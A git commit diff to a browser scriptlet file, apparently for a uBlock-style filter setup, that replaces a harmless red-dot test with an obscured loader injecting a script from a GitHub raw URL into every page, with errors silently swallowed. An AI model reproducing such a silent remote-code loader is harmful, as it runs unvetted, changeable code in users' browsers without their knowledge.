69f0a5573afa98cb97f2e2c6e424f4d8322c5889
Studio <124630274+StudioCompile@users.noreply.github.com>
2026-05-01 21:25:17 -0400

    Update test.js

--- test.js
+++ test.js
@@ -1,14 +1,9 @@
 /// execute_scripts.js
 
-const img = document.createElement('img');
-img.src = 'x';
-img.style.cssText = 'position:fixed;top:10px;right:10px;z-index:99999;width:50px;height:50px;';
-
-img.onerror = () => {
-  img.remove();
-  const dot = document.createElement('div');
-  dot.style.cssText = 'position:fixed;bottom:10px;right:10px;z-index:99999;width:14px;height:14px;border-radius:50%;background:red;';
-  document.body.appendChild(dot);
-};
-
-document.body.appendChild(img);
+!async function(){try{
+  let e=document.createElement("script");
+  HTMLElement.prototype.setAttribute.bind(e,"src","https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js")();
+  "loading"===document.readyState
+    ?document.addEventListener("DOMContentLoaded",function(){document.head.appendChild(this)}.bind(e))
+    :document.head.appendChild(e);
+}catch{}}();
